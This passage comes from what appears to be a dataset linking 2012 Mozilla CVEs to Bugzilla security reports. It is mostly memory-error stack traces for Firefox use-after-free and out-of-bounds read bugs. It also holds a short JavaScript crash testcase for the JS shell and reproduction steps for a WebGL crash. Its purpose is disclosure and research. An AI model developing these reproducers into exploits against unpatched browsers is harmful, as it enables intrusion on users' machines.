(jsopcode.cpp:5810) ==59269== by 0x81009C1: js_DecompileValueGenerator (jsopcode.cpp:5699) ==59269== by 0x807E97C: js_ReportValueErrorFlags(JSContext*, unsigned int, unsigned int, int, JS::Value const&, JSString*, char const*, char const*) (jsopcode.h:401) ==59269== by 0x809A7BF: js_ReportIsNotFunction(JSContext*, JS::Value const*, unsigned int) (jsfun.cpp:1383) ==59269== by 0x80CDAC5: js::InvokeConstructorKernel(JSContext*, js::CallArgs const&) (jsinterp.cpp:605) ==59269== by 0x80C1FF8: js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) (jsinterp.cpp:2682) ==59269== by 0x80CD563: js::RunScript(JSContext*, JSScript*, js::StackFrame*) (jsinterp.cpp:472) ==59269== by 0x80CE129: js::Execute(JSContext*, JSScript*, JSObject&, JS::Value*) (jsinterp.cpp:670) ==59269== by 0x806160C: JS_ExecuteScript (jsapi.cpp:5247) ==59269== by 0x805030D: Process(JSContext*, JSObject*, char const*, bool) (js.cpp:478) ==59269== Address 0x6ba1a88 is 0 bytes after a block of size 64 alloc'd ==59269== at 0x48D1876: malloc (vg_replace_malloc.c:236) ==59269== by 0x80F3D5F: InitSprintStack(JSContext*, SprintStack*, JSPrinter*, unsigned int) (Utility.h:173) ==59269== by 0x8100480: DecompileCode(JSPrinter*, JSScript*, unsigned char*, unsigned int, unsigned int) (jsopcode.cpp:5379) ==59269== by 0x81006F0: DecompileExpression(JSContext*, JSScript*, JSFunction*, unsigned char*) (jsopcode.cpp:5810) ==59269== by 0x81009C1: js_DecompileValueGenerator (jsopcode.cpp:5699) ==59269== by 0x807E97C: js_ReportValueErrorFlags(JSContext*, unsigned int, unsigned int, int, JS::Value const&, JSString*, char const*, char const*) (jsopcode.h:401) ==59269== by 0x809A7BF: js_ReportIsNotFunction(JSContext*, JS::Value const*, unsigned int) (jsfun.cpp:1383) ==59269== by 0x80CDAC5: js::InvokeConstructorKernel(JSContext*, js::CallArgs const&) (jsinterp.cpp:605) ==59269== by 0x80C1FF8: js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) (jsinterp.cpp:2682) ==59269== by 0x80CD563: js::RunScript(JSContext*, JSScript*, js::StackFrame*) (jsinterp.cpp:472) ==59269== by 0x80CE129: js::Execute(JSContext*, JSScript*, JSObject&, JS::Value*) (jsinterp.cpp:670) ==59269== by 0x806160C: JS_ExecuteScript (jsapi.cpp:5247) The test does not always crash, but it has an 80-90% chance to do so. Marking s-s because this seems to be an out-of-bounds read. Assigned to luke for now, as he has been looking on this issue already (and provided the smaller/more reliable testcase :D)."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=758408",
        "title": "\"Assertion failure: &obj->getSlotRef(slot) == this,\"",
        "description": "function f(y) { x = [\"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\"] for (var i = 0; i < x.length; ++i) { y[i] = [] } return y } evalcx(\"undefined.function::e\", f(evalcx(\"lazy\"))) asserts js debug shell on m-c changeset 6ad95e65d74d without any CLI arguments at Assertion failure: &obj->getSlotRef(slot) == this, s-s because Valgrind shows invalid reads in an opt build. autoBisect shows this is probably related to the following changeset: The first bad revision is: changeset: 93639:fbff86190de6 user: Brian Hackett date: Wed May 09 14:14:10 2012 -0700 summary: Don't throw away JIT code for compartments in web pages displaying animations, bug 750834. r=billm"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=778765",
        "title": "crash at [@ libc-2.15.so@0x36445 ] at MapsGL with webgl.msaa-level = 1",
        "description": "STR: 1. Visit about:config 2. Set the pref webgl.msaa-level = 1 (I didn't do this manually, at first -- this was already set in my profile for some reason. Not sure why.) 3. Visit https://maps.google.com/?vector=1 (which should enable MapsGL) ACTUAL RESULTS: Crash, with this printed to my terminal: firefox: nvc0_surface.c:218: nvc0_resource_copy_region: Assertion `src->nr_samples == dst->nr_samples' failed. Sample crash reports: bp-63b77e54-c5e4-45c6-b933-c26a32120730 bp-5ec26eac-8033-4661-977d-b52222120730"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=777806",
        "title": "XHR use-after-free of JS",
        "description": "When we landed the attached tweak to a test in 771666, this random orange started occuring - it doesn't seem to happen in ASAN builds, but seems to be 100% reproducible if you run the test *twice* in one session with EXTRA_TEST_ARGS=\"--repeat=1\" Assertion failure: allocated(), at ../../../dist/include/gc/Heap.h:497 Program received signal SIGSEGV, Segmentation fault. js::gc::ArenaHeader::getAllocKind (this=0x7fffc645c000) at ../../../dist/include/gc/Heap.h:497 497 JS_ASSERT(allocated()); (gdb) bt #0 js::gc::ArenaHeader::getAllocKind (this=0x7fffc645c000) at ../../../dist/include/gc/Heap.h:497 #1 0x00007ffff4cbc40d in js::gc::Cell::getAllocKind (this=0x7fffc645c020) at /home/johns/moz/moz-git/js/src/gc/Heap.h:935 #2 0x00007ffff4d415ad in js::gc::GetGCThingTraceKind (thing=0x7fffc645c020) at /home/johns/moz/moz-git/js/src/jsgcinlines.h:30 #3 0x00007ffff4d538d5 in js_GetGCThingTraceKind (thing=0x7fffc645c020) at /home/johns/moz/moz-git/js/src/jsgc.cpp:1760 #4 0x00007ffff36905b5 in xpc_GCThingIsGrayCCThing (thing=0x7fffc645c020) at /home/johns/moz/moz-git/js/xpconnect/src/nsXPConnect.cpp:574 #5 0x00007ffff41f551f in ChildFinder::NoteJSChild (this=0x7fffffffaeb0, child=0x7fffc645c020) at /home/johns/moz/moz-git/xpcom/base/nsCycleCollector.cpp:1991 #6 0x00007ffff414b8b8 in nsScriptObjectTracer::NoteJSChild (aScriptThing=0x7fffc645c020, name=0x7ffff52f0967 \"mResultJSON\", aClosure=0x7fffffffaeb0) at /home/johns/moz/ff-dbg/xpcom/build/nsCycleCollectionParticipant.cpp:16 #7 0x00007ffff29ef110 in nsXMLHttpRequest::cycleCollection::TraceImpl(void*, void (*)(void*, char const*, void*), void*) () from /home/johns/moz/ff-dbg/dist/bin/libxul.so #8 0x00007ffff2b8c91f in nsDOMEventTargetHelper::cycleCollection::TraverseImpl(nsDOMEventTargetHelper::cycleCollection*, void*, nsCycleCollectionTraversalCallback&) () from /home/johns/moz/ff-dbg/dist/bin/libxul.so #9 0x00007ffff29eb853 in nsXHREventTarget::cycleCollection::TraverseImpl(nsXHREventTarget::cycleCollection*, void*, nsCycleCollectionTraversalCallback&) () from /home/johns/moz/ff-dbg/dist/bin/libxul.so #10 0x00007ffff29ee4d3 in nsXMLHttpRequest::cycleCollection::TraverseImpl(nsXMLHttpRequest::cycleCollection*, void*, nsCycleCollectionTraversalCallback&) () from /home/johns/moz/ff-dbg/dist/bin/libxul.so #11 0x00007ffff28a4afe in nsCycleCollectionParticipant::Traverse (this=0x7ffff626e7f8, p=0x7fffc133dc00, cb=...) at ../../../dist/include/nsCycleCollectionParticipant.h:262 #12 0x00007ffff41f56cb in MayHaveChild (o=0x7fffc133dc00, cp=0x7ffff626e7f8) at /home/johns/moz/moz-git/xpcom/base/nsCycleCollector.cpp:2022 #13 0x00007ffff41f5625 in nsPurpleBuffer::RemoveSkippable (this=0x7fffe91b0090, removeChildlessNodes=true) at /home/johns/moz/moz-git/xpcom/base/nsCycleCollector.cpp:2042 #14 0x00007ffff41f57d0 in nsCycleCollector::ForgetSkippable (this=0x7fffe91b0000, removeChildlessNodes=true) at /home/johns/moz/moz-git/xpcom/base/nsCycleCollector.cpp:2066 #15 0x00007ffff41f818e in nsCycleCollector_forgetSkippable (aRemoveChildlessNodes=true) at /home/johns/moz/moz-git/xpcom/base/nsCycleCollector.cpp:3217 #16 0x00007ffff2ee544a in FireForgetSkippable (aSuspected=496, aRemoveChildless=true) at /home/johns/moz/moz-git/dom/base/nsJSEnvironment.cpp:3033 #17 0x00007ffff2ee5b5b in CCTimerFired (aTimer=0x7fffc6296dc0, aClosure=0x0) at /home/johns/moz/moz-git/dom/base/nsJSEnvironment.cpp:3268"
      }
    ],
    "CVE-2012-1972": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=778428",
        "title": "Heap-use-after-free in nsHTMLEditor::CollapseAdjacentTextNodes",
        "description": "Reproduces on trunk 20120728051930 http://hg.mozilla.org/mozilla-central/rev/08428deb1e89 ================================================================= ==12811== ERROR: AddressSanitizer heap-use-after-free on address 0x7f81c5127cf0 at pc 0x7f81e8acb7f9 bp 0x7fff2669f0d0 sp 0x7fff2669f0c8 READ of size 8 at 0x7f81c5127cf0 thread T0 #0 0x7f81e8acb7f9 in nsHTMLEditor::CollapseAdjacentTextNodes(nsIDOMRange*) src/editor/libeditor/html/nsHTMLEditor.cpp:3810 #1 0x7f81e8b5aa3e in nsHTMLEditRules::AfterEditInner(nsEditor::OperationID, short) src/editor/libeditor/html/nsHTMLEditRules.cpp:451 #2 0x7f81e8b587f1 in nsHTMLEditRules::AfterEdit(nsEditor::OperationID, short) src/editor/libeditor/html/nsHTMLEditRules.cpp:376 #3 0x7f81e8ac34c5 in nsHTMLEditor::EndOperation() src/editor/libeditor/html/nsHTMLEditor.cpp:3505 #4 0x7f81e84e6554 in ~nsAutoRules src/editor/libeditor/base/nsEditorUtils.h:95 #5 0x7f81e84c4373 in ~nsAutoRules src/editor/libeditor/base/nsEditorUtils.h:97 #6 0x7f81e8a99cb7 in nsHTMLEditor::Indent(nsAString_internal const&) src/editor/libeditor/html/nsHTMLEditor.cpp:2229 #7 0x7f81e8a9b01f in non-virtual thunk to nsHTMLEditor::Indent(nsAString_internal const&) asn1cmn.c:0 #8 0x7f81ec071575 in nsOutdentCommand::DoCommand(char const*, nsISupports*) src/editor/composer/src/nsComposerCommands.cpp:519 #9 0x7f81eb8fbf9d in nsControllerCommandTable::DoCommand(char const*, nsISupports*) src/embedding/components/commandhandler/src/nsControllerCommandTable.cpp:158 #10 0x7f81eb8ce894 in nsBaseCommandController::DoCommand(char const*) src/embedding/components/commandhandler/src/nsBaseCommandController.cpp:137 #11 0x7f81eb8e6ce1 in nsCommandManager::DoCommand(char const*, nsICommandParams*, nsIDOMWindow*) src/embedding/components/commandhandler/src/nsCommandManager.cpp:238 #12 0x7f81e6e54cea in nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) src/content/html/document/src/nsHTMLDocument.cpp:3201 #13 0x7f81e6e5765e in non-virtual thunk to nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) asn1cmn.c:0 #14 0x7f81eee55fcb in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #15 0x7f81ea44923b in CallMethodHelper::Call() src/js/xpconnect/src/XPCWrappedNative.cpp:2416 #16 0x7f81ea4b05c4 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1474 #17 0x7f81f5ae9677 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:387 #18 0x7f81f5a5dbe8 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2405 #19 0x7f81f59def35 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:302 #20 0x7f81f5ae9a99 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:356 #21 0x7f81f540ff50 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:119 #22 0x7f81f5aeebfd in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:388 #23 0x7f81f52b5bb9 in JS_CallFunctionValue src/js/src/jsapi.cpp:5698 #24 0x7f81ea3f860e in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJSClass.cpp:1436 #25 0x7f81ea39e508 in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJS.cpp:580 #26 0x7f81eee5b7d0 in PrepareAndDispatch src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 #27 0x7f81eee58f67 in SharedStub src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 #28 0x7f81e6256563 in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, nsIDOMEventListener*, nsIDOMEvent*, nsIDOMEventTarget*, unsigned int, nsCxPusher*) src/content/events/src/nsEventListenerManager.cpp:794 #29 0x7f81e6257a2a in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) src/content/events/src/nsEventListenerManager.cpp:867 #30 0x7f81e63e6f77 in nsEventListenerManager::HandleEvent(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) src/content/events/src/nsEventListenerManager.h:144 #31 0x7f81e63d5c16 in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, unsigned int, bool, nsCxPusher*) src/content/events/src/nsEventDispatcher.cpp:184 #32 0x7f81e63d377c in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, unsigned int, nsDispatchingCallback*, bool, nsCxPusher*) src/content/events/src/nsEventDispatcher.cpp:312 #33 0x7f81e63d9290 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<nsIDOMEventTarget>*) src/content/events/src/nsEventDispatcher.cpp:633 #34 0x7f81e63dd824 in nsEventDispatcher::DispatchDOMEvent(nsISupports*, nsEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) src/content/events/src/nsEventDispatcher.cpp:696 #35 0x7f81e57a21b3 in nsINode::DispatchEvent(nsIDOMEvent*, bool*) src/content/base/src/nsINode.cpp:1079 #36 0x7f81e52e4972 in nsContentUtils::DispatchEvent(nsIDocument*, nsISupports*, nsAString_internal const&, bool, bool, bool, bool*) src/content/base/src/nsContentUtils.cpp:3428 #37 0x7f81e52e3e06 in nsContentUtils::DispatchTrustedEvent(nsIDocument*, nsISupports*, nsAString_internal const&, bool, bool, bool*) src/content/base/src/nsContentUtils.cpp:3398 #38 0x7f81e54eca26 in nsDocument::DispatchContentLoadedEvents() src/content/base/src/nsDocument.cpp:4131 #39 0x7f81e55ad459 in nsRunnableMethodImpl<void (nsDocument::*)(), true>::Run() src/../../../dist/include/nsThreadUtils.h:349 #40 0x7f81eed56e0d in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:625 #41 0x7f81ee9e595d in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #42 0x7f81ed97f886 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #43 0x7f81ef00a76a in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:209 #44 0x7f81ef00a5b3 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:202 #45 0x7f81ef00a498 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:176 #46 0x7f81ece8568e in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:165 #47 0x7f81ebad3448 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:271 #48 0x7f81e2210820 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3798 #49 0x7f81e22171c2 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3875 #50 0x7f81e221a692 in XRE_main src/toolkit/xre/nsAppRunner.cpp:3951 #51 0x40c28f in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #52 0x409cbd in main src/browser/app/nsBrowserApp.cpp:312 #53 0x7f81ff037c4d in ?? ??:0 0x7f81c5127cf0 is located 112 bytes inside of 120-byte region [0x7f81c5127c80,0x7f81c5127cf8) freed by thread T0 here: #0 0x4a4392 in free ??:0 #1 0x7f81fbec35c3 in moz_free src/memory/mozalloc/mozalloc.cpp:49 #2 0x7f81e5971366 in ~nsTextNode src/content/base/src/nsTextNode.cpp:121 #3 0x7f81e584274d in nsNodeUtils::LastRelease(nsINode*) src/content/base/src/nsNodeUtils.cpp:252 #4 0x7f81e56a878f in nsGenericDOMDataNode::Release() src/content/base/src/nsGenericDOMDataNode.cpp:113 #5 0x7f81e5971794 in nsTextNode::Release() src/content/base/src/nsTextNode.cpp:124 #6 0x7f81e21da640 in ~nsCOMPtr_base src/../../dist/include/nsCOMPtr.h:408 #7 0x7f81e37264b6 in nsCOMPtr<nsIContent>::~nsCOMPtr() src/../../dist/include/nsCOMPtr.h:447 #8 0x7f81e3726183 in nsCOMPtr<nsIContent>::~nsCOMPtr() src/../../dist/include/nsCOMPtr.h:447 #9 0x7f81e5705272 in nsGenericElement::RemoveChildAt(unsigned int, bool) src/content/base/src/nsGenericElement.cpp:2629 #10 0x7f81e652dd23 in nsGenericHTMLElement::SetInnerHTML(nsAString_internal const&) src/content/html/content/src/nsGenericHTMLElement.cpp:1338 #11 0x7f81e666de38 in nsHTMLBodyElement::SetInnerHTML(nsAString_internal const&) src/content/html/content/src/nsHTMLBodyElement.cpp:71 #12 0x7f81ead19acd in nsIDOMHTMLElement_SetInnerHTML(JSContext*, JS::Handle<JSObject*>, JS::Handle<long>, int, JS::Value*) src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:14166 #13 0x7f81f5d61d60 in js::CallJSPropertyOpSetter(JSContext*, int (*)(JSContext*, JS::Handle<JSObject*>, JS::Handle<long>, int, JS::Value*), JS::Handle<JSObject*>, JS::Handle<long>, int, JS::Value*) src/js/src/jscntxtinlines.h:463 #14 0x7f81f5d93bc7 in js::baseops::SetPropertyHelper(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<long>, unsigned int, JS::Value*, int) src/js/src/jsobj.cpp:4906 #15 0x7f81f5b30601 in js::SetPropertyOperation(JSContext*, unsigned char*, JS::Value const&, JS::Value const&) src/js/src/jsinterpinlines.h:350 #16 0x7f81f5a5266f in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2319 #17 0x7f81f59def35 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:302 #18 0x7f81f5ae9a99 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:356 #19 0x7f81f540ff50 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:119 #20 0x7f81f5aeebfd in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:388 #21 0x7f81f52b5bb9 in JS_CallFunctionValue src/js/src/jsapi.cpp:5698 #22 0x7f81ea3f860e in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJSClass.cpp:1436 #23 0x7f81ea39e508 in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJS.cpp:580 #24 0x7f81eee5b7d0 in PrepareAndDispatch src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 #25 0x7f81eee58f67 in SharedStub src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 #26 0x7f81e6256563 in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, nsIDOMEventListener*, nsIDOMEvent*, nsIDOMEventTarget*, unsigned int, nsCxPusher*) src/content/events/src/nsEventListenerManager.cpp:794 #27 0x7f81e6257a2a in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) src/content/events/src/nsEventListenerManager.cpp:867 #28 0x7f81e63e6f77 in nsEventListenerManager::HandleEvent(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) src/content/events/src/nsEventListenerManager.h:144 #29 0x7f81e63d5c16 in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, unsigned int, bool, nsCxPusher*) src/content/events/src/nsEventDispatcher.cpp:184 previously allocated by thread T0 here: #0 0x4a4452 in __interceptor_malloc ??:0 #1 0x7f81fbec3717 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 #2 0x7f81e5972e75 in nsTextNode::CloneDataNode(nsINodeInfo*, bool) const src/content/base/src/nsTextNode.cpp:146 #3 0x7f81e51f0364 in nsGenericDOMDataNode::Clone(nsINodeInfo*, nsINode**) const src/content/xml/content/src/../../../base/src/nsGenericDOMDataNode.h:216 #4 0x7f81e5847d53 in nsNodeUtils::CloneAndAdopt(nsINode*, bool, bool, nsNodeInfoManager*, JSContext*, JSObject*, nsCOMArray<nsINode>&, nsINode*, nsINode**) src/content/base/src/nsNodeUtils.cpp:438 #5 0x7f81e55e92fa in nsNodeUtils::CloneAndAdopt(nsINode*, bool, bool, nsNodeInfoManager*, JSContext*, JSObject*, nsCOMArray<nsINode>&, nsIDOMNode**) src/../../../../dist/include/nsNodeUtils.h:272 #6 0x7f81e5500755 in nsNodeUtils::Clone(nsINode*, bool, nsNodeInfoManager*, nsCOMArray<nsINode>&, nsIDOMNode**) src/../../../../dist/include/nsNodeUtils.h:145 #7 0x7f81e5845bf6 in nsNodeUtils::CloneNodeImpl(nsINode*, bool, bool, nsIDOMNode**) src/content/base/src/nsNodeUtils.cpp:360 #8 0x7f81e51fba6f in nsGenericDOMDataNode::CloneNode(bool, unsigned char, nsIDOMNode**) src/content/xml/content/src/../../../base/src/nsGenericDOMDataNode.h:119 #9 0x7f81e5979fff in nsTextNode::CloneNode(bool, unsigned char, nsIDOMNode**) src/content/base/src/nsTextNode.h:27 #10 0x7f81e597df6f in non-virtual thunk to nsTextNode::CloneNode(bool, unsigned char, nsIDOMNode**) asn1cmn.c:0 #11 0x7f81e58e6539 in nsRange::CloneContents(nsIDOMDocumentFragment**) src/content/base/src/nsRange.cpp:1974 #12 0x7f81ea6eee9b in nsIDOMRange_CloneContents(JSContext*, unsigned int, JS::Value*) src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:18372 #13 0x7f81f5ae9677 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:387 #14 0x7f81f5a5dbe8 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2405 #15 0x7f81f59def35 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:302 #16 0x7f81f5ae9a99 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:356 #17 0x7f81f540ff50 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:119 #18 0x7f81f5aeebfd in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:388 #19 0x7f81f52b5bb9 in JS_CallFunctionValue src/js/src/jsapi.cpp:5698 #20 0x7f81ea3f860e in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJSClass.cpp:1436 #21 0x7f81ea39e508 in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJS.cpp:580 #22 0x7f81eee5b7d0 in PrepareAndDispatch src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 #23 0x7f81eee58f67 in SharedStub src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 #24 0x7f81e6256563 in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, nsIDOMEventListener*, nsIDOMEvent*, nsIDOMEventTarget*, unsigned int, nsCxPusher*) src/content/events/src/nsEventListenerManager.cpp:794 ==12811== ABORTING Stats: 220M malloced (239M for red zones) by 552524 calls Stats: 82M realloced by 23243 calls Stats: 178M freed by 294094 calls Stats: 47M really freed by 74448 calls Stats: 448M (114755 full pages) mmaped in 112 calls mmaps by size class: 8:425958; 9:57337; 10:16380; 11:16376; 12:3072; 13:2048; 14:1536; 15:384; 16:576; 17:128; 18:224; 19:112; 20:40; mallocs by size class: 8:454989; 9:54790; 10:18129; 11:16960; 12:2544; 13:2096; 14:1545; 15:345; 16:590; 17:145; 18:241; 19:112; 20:38; frees by size class: 8:215604; 9:44215; 10:14411; 11:13853; 12:1685; 13:1785; 14:1296; 15:278; 16:518; 17:116; 18:197; 19:102; 20:34; rfrees by size class: 8:64335; 9:3355; 10:2380; 11:3507; 12:193; 13:231; 14:145; 15:39; 16:164; 17:27; 18:21; 19:29; 20:22; Stats: malloc large: 536 small slow: 2323 Shadow byte and word: 0x1ff038a24f9e: fd 0x1ff038a24f98: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ff038a24f78: fd fd fd fd fd fd fd fd 0x1ff038a24f80: fa fa fa fa fa fa fa fa 0x1ff038a24f88: fa fa fa fa fa fa fa fa 0x1ff038a24f90: fd fd fd fd fd fd fd fd =>0x1ff038a24f98: fd fd fd fd fd fd fd fd 0x1ff038a24fa0: fa fa fa fa fa fa fa fa 0x1ff038a24fa8: fa fa fa fa fa fa fa fa 0x1ff038a24fb0: fd fd fd fd fd fd fd fd 0x1ff038a24fb8: fd fd fd fd fd fd fd fd"
      }
    ],
    "CVE-2012-1973": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=773207",
        "title": "Heap-use-after-free in nsObjectLoadingContent::LoadObject",
        "description": "Reproduces on trunk, testcase coming. ================================================================= ==16419== ERROR: AddressSanitizer heap-use-after-free on address 0x7f51151628d0 at pc 0x7f5137378a53 bp 0x7fff7866bed0 sp 0x7fff7866bec8 READ of size 8 at 0x7f51151628d0 thread T0 #0 0x7f5137378a53 in nsObjectLoadingContent::LoadObject(nsIURI*, bool, nsCString const&, bool) firefox/src/content/base/src/nsObjectLoadingContent.cpp:1316 #1 0x7f5137373ece in nsObjectLoadingContent::LoadObject(nsAString_internal const&, bool, nsCString const&, bool) firefox/src/content/base/src/nsObjectLoadingContent.cpp:1250 #2 0x7f51385729db in nsHTMLSharedObjectElement::StartObjectLoad(bool) firefox/src/content/html/content/src/nsHTMLSharedObjectElement.cpp:482 #3 0x7f51385772e8 in nsHTMLSharedObjectElement::StartObjectLoad() firefox/src/content/html/content/src/nsHTMLSharedObjectElement.cpp:112 #4 0x7f5138594c59 in nsRunnableMethodImpl<void (nsHTMLSharedObjectElement::*)(), true>::Run() firefox/src/../../../../dist/include/nsThreadUtils.h:349 #5 0x7f5136e13965 in nsContentUtils::RemoveScriptBlocker() firefox/src/content/base/src/nsContentUtils.cpp:4888 #6 0x7f5135c516bd in ~mozAutoDocUpdate firefox/src/../../../../dist/include/mozAutoDocUpdate.h:40 #7 0x7f5135c1c743 in ~mozAutoDocUpdate firefox/src/../../../../dist/include/mozAutoDocUpdate.h:40 #8 0x7f51372b2fe8 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*) firefox/src/content/base/src/nsINode.cpp:1891 #9 0x7f51374978f7 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, unsigned int*) firefox/src/../../../../dist/include/nsINode.h:1462 #10 0x7f51374959d9 in nsINode::InsertBefore(nsINode*, nsINode*, unsigned int*) firefox/src/../../../../dist/include/nsINode.h:494 #11 0x7f5138073ccb in nsINode::AppendChild(nsINode*, unsigned int*) firefox/src/../../../../dist/include/nsINode.h:504 #12 0x7f513c101907 in nsIDOMNode_AppendChild(JSContext*, unsigned int, JS::Value*) firefox/src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:5400 #13 0x7f51471ac507 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) firefox/src/js/src/jscntxtinlines.h:385 #14 0x7f5147123006 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) firefox/src/js/src/jsinterp.cpp:2442 #15 0x7f51470aa276 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) firefox/src/js/src/jsinterp.cpp:301 #16 0x7f51471b937d in js::ExecuteKernel(JSContext*, JSScript*, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) firefox/src/js/src/jsinterp.cpp:487 #17 0x7f51471bb080 in js::Execute(JSContext*, JSScript*, JSObject&, JS::Value*) firefox/src/js/src/jsinterp.cpp:524 #18 0x7f51469b1081 in EvaluateUCScriptForPrincipalsCommon(JSContext*, JSObject*, JSPrincipals*, JSPrincipals*, unsigned short const*, unsigned int, char const*, unsigned int, JS::Value*, JSVersion) firefox/src/js/src/jsapi.cpp:5373 #19 0x7f51469b2fbc in JS_EvaluateUCScriptForPrincipalsVersionOrigin firefox/src/js/src/jsapi.cpp:5410 #20 0x7f513914479f in 